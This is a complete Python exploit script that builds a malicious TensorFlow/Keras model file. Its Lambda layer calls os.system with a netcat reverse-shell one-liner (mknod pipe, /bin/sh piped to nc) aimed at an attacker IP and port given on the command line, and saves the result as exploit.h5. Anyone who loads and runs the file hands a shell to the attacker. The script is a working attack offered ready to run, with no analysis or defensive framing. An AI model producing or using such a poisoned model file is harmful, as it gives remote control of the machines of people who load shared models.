# Python 3.8 required
import sys
import tensorflow as tf

# Global variables
attacker_ip = ""
attacker_port = ""

def exploit(x):
    # Python code can be serialized, so we can import os library
    import os
    os.system(f"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f")
    return x

if __name__ == "__main__":

    if len(sys.argv) != 3:
        print("Usage: python exploit.py <IP_ADDR> <PORT>")
        sys.exit(1)

    else:
        attacker_ip = sys.argv[1]
        attacker_port = sys.argv[2]

        model = tf.keras.Sequential()
        model.add(tf.keras.layers.Input(shape=(64,)))
        model.add(tf.keras.layers.Lambda(exploit))
        model.compile()
        model.save("exploit.h5")